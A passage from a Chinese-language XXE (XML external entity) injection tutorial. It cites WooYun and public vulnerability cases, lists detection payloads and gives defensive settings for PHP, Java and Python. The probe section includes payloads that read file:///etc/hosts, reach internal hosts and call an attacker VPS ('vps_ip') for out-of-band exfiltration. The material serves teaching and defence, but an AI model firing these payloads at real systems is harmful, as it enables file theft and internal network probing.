- [WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））](http://www.anquan.us/static/bugs/wooyun-2015-0156208.html)服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。

- [WooYun-2016-168457（唯品会存在Blind XXE 漏洞）](http://www.anquan.us/static/bugs/wooyun-2016-0168457.html)。作者说 关于XXE，觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 [WooYun-2016-166751(Xfire文件读取漏洞)](http://www.anquan.us/static/bugs/wooyun-2016-0166751.html)。

- [WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）](http://www.anquan.us/static/bugs/wooyun-2014-059911.html)XXE读取到脚本文件/home/run/ssh_go.sh，内含SSH登陆密码。

- [Revisting XXE and abusing protocols](https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/) 【XXE+expect模块=>Facbook RCE】

- [XXE on Windows system …then what ??](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745) 【XXE+SMB=>内网RCE】

- [Apache Solr XXE漏洞分析](https://xz.aliyun.com/t/2448) 【CVE-2018-8026】

- [Phone Call to XXE via Interactive Voice Response](https://hackerone.com/reports/395296) 【打个电话也能XXE ![:blush:](https://www.secquan.org/assets/images/emoji/blush.png)】

## 0x06XXE自动化工具

　　XXEinjector：一款功能强大的自动化XXE注射工具。

　　本文就不具体演示、讲述此工具了。推荐一篇[文章](http://www.freebuf.com/column/170971.html)，详细的讲述了其使用方法，最后还附了XXEinjector工具的下载。

## 0x07寻找XXE

**检测xml是否被解析**

　　尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。

- 单双引号 `'` `"` ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。
- 尖括号`< >` ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。
- 注释符`<!--` ：XML使用`<!-- This is a comment -->`作注释。
- `&` ：& 用于引用实体。
- CDATA 分隔符`]]>` ：`<![CDATA[foo]]>`中的内容不被解析器解析，提前闭合引发异常。

**检测是否支持外部实体解析**

　　尝试利用实体和DTD。

- 引用外部DTD文件访问内网主机/端口 ：`<!DOCTYPE a SYSTEM "http://127.0.0.1:2333">`（看响应时间）
- 引用外部DTD文件访问外网 ：`<!DOCTYPE a SYSTEM "http://vps_ip" >`
- 引用内部实体 ：`<!DOCTYPE a [<!ENTITY xxe "findneo">]><a>&xxe;</a>`
- 外部实体读本地文件 ：`<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><a>&xxe;</a>`
- 外部实体访问内网主机/端口 ：`<!DOCTYPE a SYSTEM "http://192.168.1.2:80">`（看响应时间）
- 外部实体访问外网 ：`<!DOCTYPE a [<!ENTITY xxe SYSTEM "http://vps_ip">]><a>&xxe;</a>`
- 判断问题存在可以OOB提取数据。

## 0x08XXE的防御

- 使用开发语言提供的禁用外部实体的方法

　　**PHP**

　　`libxml_disable_entity_loader(true);`

　　**JAVA**

　　 `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();`

　　 `dbf.setExpandEntityReferences(false);`

　　**Python**

　　`from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))`

- 过滤用户提交的XML数据

　　过滤关键词：`<!DOCTYPE`和`<!ENTITY`，或者`SYSTEM`和`PUBLIC`。

转载自：安全圈secquan

## 参考资料

1. <http://www.freebuf.com/column/156863.html>
2. <https://security.tencent.com/index.php/blog/msg/69>
3. <https://xz.aliyun.com/t/2571#toc-10>
4. <http://www.w3school.com.cn/dtd/>

[joychou的博文](https://joychou.org/web/XML-External-Entity-Injection.html#directory049263776422638269)



